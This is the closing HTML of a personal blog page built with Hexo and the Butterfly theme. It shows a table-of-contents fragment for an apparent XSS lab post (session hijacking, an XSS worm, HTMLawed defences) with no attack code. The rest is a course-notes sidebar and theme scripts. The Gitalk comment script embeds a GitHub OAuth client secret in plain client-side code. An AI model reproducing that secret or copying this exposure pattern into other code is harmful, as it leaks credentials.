+脚本自动发起会话劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-3%E6%9E%84%E9%80%A0-xss-%E8%A0%95%E8%99%AB"><span class="toc-number">1.2.3.</span> <span class="toc-text">任务 3：构造 XSS 蠕虫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1-4%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">任务 4：防御策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%85%E5%90%AF%E7%94%A8-htmlawed-1.9"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">仅启用 HTMLawed 1.9</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/zh/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/" title="11711 Advanced NLP: Retrieval and RAG"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" onerror="this.onerror=null;this.src='/zh/img/404.jpg'" alt="11711 Advanced NLP: Retrieval and RAG"/></a><div class="content"><a class="title" href="/zh/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/" title="11711 Advanced NLP: Retrieval and RAG">11711 Advanced NLP: Retrieval and RAG</a><time datetime="2026-02-14T22:08:21.000Z" title="发表于 2026-02-14 17:08:21">2026-02-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/zh/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/" title="11868 LLM系统：解码"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" onerror="this.onerror=null;this.src='/zh/img/404.jpg'" alt="11868 LLM系统：解码"/></a><div class="content"><a class="title" href="/zh/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/" title="11868 LLM系统：解码">11868 LLM系统：解码</a><time datetime="2026-02-13T01:00:00.000Z" title="发表于 2026-02-12 20:00:00">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/zh/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/" title="11868 LLM Sys: Tokenization and Embedding"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" onerror="this.onerror=null;this.src='/zh/img/404.jpg'" alt="11868 LLM Sys: Tokenization and Embedding"/></a><div class="content"><a class="title" href="/zh/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/" title="11868 LLM Sys: Tokenization and Embedding">11868 LLM Sys: Tokenization and Embedding</a><time datetime="2026-02-12T20:30:00.000Z" title="发表于 2026-02-12 15:30:00">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/zh/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/" title="15642 机器学习系统：Transformer、注意力机制与优化"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260122210733236.png" onerror="this.onerror=null;this.src='/zh/img/404.jpg'" alt="15642 机器学习系统：Transformer、注意力机制与优化"/></a><div class="content"><a class="title" href="/zh/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/" title="15642 机器学习系统：Transformer、注意力机制与优化">15642 机器学习系统：Transformer、注意力机制与优化</a><time datetime="2026-02-09T19:30:00.000Z" title="发表于 2026-02-09 14:30:00">2026-02-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/zh/2026/02/09/CS336/CS336-Assignment-1-Building-a-Transformer-Language-Model-from-Scratch/" title="CS336 Assignment 1: Building a Transformer Language Model from Scratch"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251214181527015.png" onerror="this.onerror=null;this.src='/zh/img/404.jpg'" alt="CS336 Assignment 1: Building a Transformer Language Model from Scratch"/></a><div class="content"><a class="title" href="/zh/2026/02/09/CS336/CS336-Assignment-1-Building-a-Transformer-Language-Model-from-Scratch/" title="CS336 Assignment 1: Building a Transformer Language Model from Scratch">CS336 Assignment 1: Building a Transformer Language Model from Scratch</a><time datetime="2026-02-09T04:05:02.000Z" title="发表于 2026-02-08 23:05:02">2026-02-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Xiang Li</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/zh/js/utils.js"></script><script src="/zh/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const commentCount = n => {
+    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+    if (isCommentCount) {
+      isCommentCount.textContent= n
+    }
+  }
+
+  const initGitalk = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGitalk = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const gitalk = new Gitalk({
+      clientID: 'fb37ffde539166b338d8',
+      clientSecret: '00c01014243d312219aa68b6a2e22f7f19f4c8ef',
+      repo: 'blog-comments',
+      owner: 'XLOverflow',
+      admin: ['XLOverflow'],
+      updateCountCallback: commentCount,
+      ...option,
+      id: isShuoshuo ? path : (option && option.id) || '59636fa61d2b4b618057d1906906d7b5'
+    })
+
+    gitalk.render('gitalk-container')
+  }
+
+  const loadGitalk = async(el, path) => {
+    if (typeof Gitalk === 'function') initGitalk(el, path)
+    else {
+      await btf.getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+      await btf.getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
+      initGitalk(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Gitalk' === 'Gitalk'
+      ? window.shuoshuoComment = { loadComment: loadGitalk }
+      : window.loadOtherComment = loadGitalk
+    return
+  }
+
+  if ('Gitalk' === 'Gitalk' || !true) {
+    if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+    else loadGitalk()
+  } else {
+    window.loadOtherComment = loadGitalk
+  }
+})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/zh/404.html') : window.location.href = '/zh/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
